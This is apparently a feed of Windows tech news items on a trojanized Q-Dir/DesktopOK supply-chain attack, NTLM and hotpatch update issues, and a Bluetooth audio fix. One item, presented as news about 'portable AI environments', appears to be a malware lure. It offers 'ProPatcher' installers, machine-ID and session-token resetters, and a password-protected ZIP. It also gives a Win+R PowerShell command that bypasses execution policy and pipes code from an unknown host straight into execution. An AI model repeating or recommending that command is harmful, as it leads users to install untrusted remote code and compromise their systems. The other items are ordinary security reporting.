item.title: Q-Dir and DesktopOK Installers Compromised with Python-Based Malware
item.description:
Q-Dir and DesktopOK Installers Compromised with Python-Based Malware

Official distribution channels for the popular Windows utilities Q-Dir and DesktopOK were compromised to deliver trojanized installers containing Python-based remote access malware, according to a report from AhnLab’s Security Intelligence Center (ASEC).

🧩 Malware Capabilities

The malicious installers fetch a Python Remote Access Trojan (RAT) that registers a scheduled task to persist on infected devices. The malware supports the following capabilities:

  • Shell command and Python code execution
  • File transfer
  • Screenshot capture
  • System information collection, including a list of active security products

📊 Impacted Versions

ASEC confirmed that the compromise affected both new downloads and updates for existing installations. Not all listed versions were infected. The following release versions are impacted:

Product Affected Versions
Q-Dir 12.83.0.0, 12.84.0.0, 12.85.0.0
DesktopOK 12.82.0.0, 12.85.0.0

🕵️ Security Detection Evasion

The malware collects a list of 1,206 processes matching various antivirus and endpoint detection and response (EDR) tools to relay to the command and control server. This allows operators to plan their next actions without getting detected. The targeted security products include:

  • AhnLab V3
  • CrowdStrike Falcon
  • SentinelOne
  • rend Micro
  • Avast
  • McAfee
  • ESET
  • Symantec
  • Kaspersky
  • Bitdefender
  • Sophos
  • Fortinet
  • Elastic Security
  • Malwarebytes
  • FireEye

🛡️ Remediation and Verification

AhnLab researchers provided SHA-256 hashes to help users distinguish legitimate installers from malicious ones. Users are advised to check their downloads against the SHA-256 published on the official download page.

Removing a trojanized version of Q-Dir or DesktopOK does not ensure the elimination of the Python RAT. Users who recently installed or updated these tools should treat their system as potentially compromised and check for:

  • Suspicious Python execution environments
  • Scheduled tasks
  • Traces of external network communication

The trojanized versions are digitally signed using a certificate issued to the legitimate developer, Nenad Hrg, who distributes the tools through the SoftwareOK website. ASEC could not determine how the installers were replaced or the timeframe during which the malicious versions were distributed.

#WindowsSecurity #SupplyChainAttack #Trojan #QDir #DesktopOK #Cybersecurity

Source: Q-Dir and DesktopOK Windows utilities compromised to push Python RAT

item.title: Windows Portable AI Environments with Embedded Runtimes and Quantization Support
item.description:
Windows Portable AI Environments with Embedded Runtimes and Quantization Support

A set of new pre-configured 64-bit Windows 10/11 distributions has been released, bundling runtime libraries, offline configuration profiles, and installers into single portable packages for AI development and inference tasks.

🧩 How it works

These distributions feature a zero-dependency embedded Python 3.12 runtime and a precompiled Windows x64 portable environment. The stack includes CUDA 12.6, Triton, and SageAttention-2 wheels.

Key capabilities include:

  • Native FP8, GGUF (Q4_K_M / Q5_K_M / Q8_0), and EXL2 quantized weight loader with VRAM offloading.
  • Local OpenAI-compatible REST API server and WebUI dashboard with batch queue support.
  • Automatic model checkpoint downloader.
  • Bundled C++ Runtime (vcruntime140.dll, vcruntime140_1.dll).

⚙️ Key details

Specific utility features vary by package:

  • OpenHands: Includes an automated telemetry.machineId, macMachineId, and devDeviceId UUID regenerator, a SQLite state.vscdb and storage.json session token cleaner, and a Windows Registry MachineGuid backup and clean profile switcher.
  • General Runtime: Target runtime is NVIDIA CUDA 12.6 / TensorRT 10.4 & PyTorch 2.6 x64 Runtime (cublas64_12.dll).
Package Version Binary Install Path
OpenHands v2.4.3 OpenhandsProPatcher-Installer.exe %APPDATA%\Openhands\User\globalStorage
ExLlamaV2 Windows v2.5.6 Exllamav2Windows-Setup.exe %LOCALAPPDATA%\Programs\Exllamav2Windows
ExLlamaV2 v2.6.0 Exllamav2ProPatcher-Installer.exe %LOCALAPPDATA%\Programs\Exllamav2

All packages support Windows 10 / Windows 11 (64-bit, 22H2–24H2).

🚀 Availability

Users can download portable .ZIP archives (2.66 MB, password: 2026) or use an automated PowerShell command via Win + R:

powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/[package-name] | iex"

Installers are launched from their respective install paths, with setup portals available for interactive configuration and mirrors.

item.title: Microsoft November Security Update Causes Authentication Issues Due to NTLM Message-Signing Changes
item.description:
Microsoft November Security Update Causes Authentication Issues Due to NTLM Message-Signing Changes

Microsoft has confirmed that customers may experience authentication issues after installing November security updates that address a high-severity remote code execution vulnerability. Tracked as CVE-2026-118737, this security flaw was found in the Windows Remote Procedure Call Runtime and stems from a timing-dependent authentication weakness that unauthenticated attackers can exploit to remotely execute code without user interaction on unpatched systems.

Source: Microsoft confirms authentication issues after November updates

item.title: Microsoft Fixes Bluetooth Audio Quality Issues in Windows 11
item.description:
Microsoft Fixes Bluetooth Audio Quality Issues in Windows 11

Microsoft has released preview builds for Windows 11 that resolve a long-standing audio quality problem affecting Bluetooth headphone users. The update ensures high-fidelity stereo audio continues even when the system switches between audio profiles during microphone usage.

🔍 Issue Overview

The problem occurred when Windows automatically switched from the A2DP stereo profile to the headset (hands-free) profile whenever an app or game activated the headset’s microphone. This switch caused significant audio quality drops due to bandwidth limitations in two-way mode.

🧩 Technical Solution

  • Bluetooth LE Audio devices now maintain full-range stereo fidelity while simultaneously using the device’s microphone
  • Users can select the new 2 channels, 16 bit, 48000Hz option from Settings > System > Sound > Output > {Bluetooth device} > Output settings > Format when microphone is active
  • The feature supports headphones, earbuds, and speakers that support 48kHz playback

⚙️ Key Details

Device Type Capability
Bluetooth LE Audio devices Full-range stereo fidelity with microphone active
Compatible devices Headphones, earbuds, speakers supporting 48kHz playback

🚀 Availability

The preview builds are available for Beta and Experimental channels. Windows 11 Insiders can access the fix by installing these preview builds released on Friday.

💡 Why It Matters

The improvement benefits users during game chat, voice calls, voice typing, and Copilot Chat voice functionality, ensuring consistent audio quality across all microphone-intensive applications.

#Windows #Bluetooth #Audio #Microsoft

Source: Microsoft testing fix for Windows 11 Bluetooth audio quality drops

item.title: Windows hotpatch update causes ERROR_ALLOTTED_SPACE_EXCEEDED error
item.description:
Windows hotpatch update causes ERROR_ALLOTTED_SPACE_EXCEEDED error

Devices that installed the November 2026 hotpatch update may experience errors when installing, launching, or running some applications. The error displayed is similar to “ERROR_ALLOTTED_SPACE_EXCEEDED (0xC0000099)”.

🧩 How it works

Current investigation suggests this issue occurs for applications that load the 32-bit Windows Installer DLL, found as msi.dll. This can happen more frequently with 32-bit applications, but can also occur for 64-bit applications under certain conditions.

⚙️ Key details

  • Affected Systems: This known issue impacts systems that have installed the hotpatch updates pushed through Windows Autopatch. It should not impact systems that have installed the standard November 2026 Patch Tuesday security updates.
  • Workaround: Users must edit the Windows Registry to increase the HotPatchTableSize.
  • Registry Procedure:
    1. Open the Windows Registry by typing “regedit” in the Start menu and selecting Registry Editor.
    2. Navigate to the HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management folder.
    3. Locate the “HotPatchTableSize” registry key, open it, and set the Value to “2000”.
    4. Close the registry editor and restart the device.
  • Warning: Microsoft advised backing up the registry and ensuring knowledge of how to restore it before modifying it.

🚀 Availability

  • Windows Autopatch History: Microsoft first announced Windows Autopatch in April 2022, stating it would be available for free to customers with a Windows 10/11 Enterprise E3 license or greater starting in July 2022.
  • Public Preview: The feature reached public preview in early June and has been generally available since July 2022.
  • Default Policy: Microsoft stated in March that it would turn on hotpatch security updates by default for all eligible Windows devices managed through the Microsoft Graph API and Microsoft Intune, after the May 2026 Windows security updates are installed.
  • Recent Fix: One month after the March announcement, Microsoft fixed a Windows Autopatch bug that caused driver updates restricted by administrative policies to deploy on some Autopatch-managed Windows devices belonging to customers in the European Union.

#Windows #Hotpatch #WindowsAutopatch #SecurityUpdates #Registry

Source: Microsoft confirms app installation, launch issues after hotpatch
